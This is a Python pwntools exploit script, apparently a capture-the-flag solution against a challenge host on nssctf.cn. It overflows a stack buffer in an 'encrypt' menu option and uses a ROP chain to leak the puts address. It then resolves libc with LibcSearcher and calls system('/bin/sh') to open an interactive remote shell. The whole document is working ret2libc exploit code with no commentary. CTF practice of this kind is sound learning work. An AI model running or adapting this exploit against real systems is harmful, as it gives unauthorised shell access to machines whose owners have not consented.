from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node5.anna.nssctf.cn',29548)
#io = process("./pwn")

elf = ELF('./pwn')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

pop_rdi_ret = 0x0000000000400c83
ret_addr = 0x00000000004006b9
encrypt_addr = 0x4009A0

io.recvuntil(b'Input your choice!\n')
io.sendline(b'1')

io.recvuntil(b'Input your Plaintext to be encrypted\n')
payload = b'a' * (0x50 + 0x8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)
io.sendline(payload)

puts_addr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)  #libc6_2.27-0ubuntu3_amd64
base = puts_addr - libc.dump('puts')
system_addr = base + libc.dump('system')
str_bin_sh = base + libc.dump('str_bin_sh')

payload =b'a' * (0x50 + 0x8) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(ret_addr) + p64(system_addr)

io.sendline(payload)
io.interactive()